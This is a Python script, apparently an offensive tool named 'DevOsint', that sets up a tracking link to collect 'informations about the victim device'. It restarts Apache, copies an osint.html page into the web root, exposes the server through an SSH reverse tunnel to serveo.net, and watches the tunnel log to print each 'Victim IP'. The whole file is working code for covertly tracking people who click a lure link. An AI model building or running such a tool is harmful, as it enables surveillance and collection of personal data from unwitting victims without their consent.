import os
import time
import subprocess
import re

banner = r"""
 __   ___       __   __         ___
|  \ |__  \  / /  \ /__` | |\ |  | 
|__/ |___  \/  \__/ .__/ | | \|  | 

DevOsint tool is a simple script to make a url to get informations about the victim device
Copyright: @ALHARAM
v1.3
"""

os.system("clear")
time.sleep(0.3)
print(banner)

os.system("sudo systemctl stop apache2")
os.system("sudo systemctl start apache2")

time.sleep(0.5)
public_url = input("[*] Enter the public IP or domain: ")
time.sleep(0.5)

redirect_html = os.system('cp src/osint.html /var/www/html/')

time.sleep(0.7)
print ("[*] Making the html page...")
time.sleep(0.5)
page_link = f"http://{public_url}/osint.html"
print(f"[+] Tracking link: {page_link}")

def start_serveo():
    print("[*] Launching Serveo on port 80...")
    
    subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60", "-R", "80:localhost:80", "serveo.net"], stdout=open("linksender", "w"), stderr=subprocess.DEVNULL)
    
    time.sleep(7)
    
    with open("linksender", "r") as file:
        content = file.read()
    
    match = re.search(r'https://[0-9a-z]+\.serveo\.net', content)
    send_url = match.group(0) if match else "Not Found"
    
    if send_url != "Not Found":
        send_url += "/osint.html"
    
    print(f'[*] Serveo URL: {send_url}\r\r\r')

    with open("linksender", "r") as log:
        log.seek(0, 2)  # الانتقال لنهاية الملف
        ip_regex = re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b')

        while True:
            lines = log.readlines()
            for line in lines:
                line = line.strip().replace("\r", "").replace("\n", "")  # تنظيف النص
                match = ip_regex.search(line)
                if match:
                    ip = match.group()
                    if ip :  
                        print(f"\n[*] Victim IP: {ip}\r\r\r")
start_serveo()

